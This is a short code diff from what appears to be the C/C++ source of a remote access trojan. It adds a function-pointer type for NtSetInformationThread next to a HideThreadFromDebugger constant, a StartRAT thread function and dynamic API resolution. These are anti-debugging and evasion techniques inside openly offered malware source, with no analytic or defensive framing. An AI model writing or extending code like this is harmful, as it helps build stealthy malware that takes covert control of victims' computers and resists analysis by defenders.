@@ -9,6 +9,14 @@
 
 #define HideThreadFromDebugger 0x11
 
+typedef NTSTATUS(NTAPI* NtSetInformationThread_t)(
+	HANDLE					 ThreadHandle,
+	DWORD					 ThreadInformationClass,
+	PVOID					 ThreadInformation,
+	ULONG					 ThreadInformationLength
+	);
+
+
 DWORD WINAPI StartRAT(LPVOID lpParam)
 {
 	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>("GetCurrentThread");
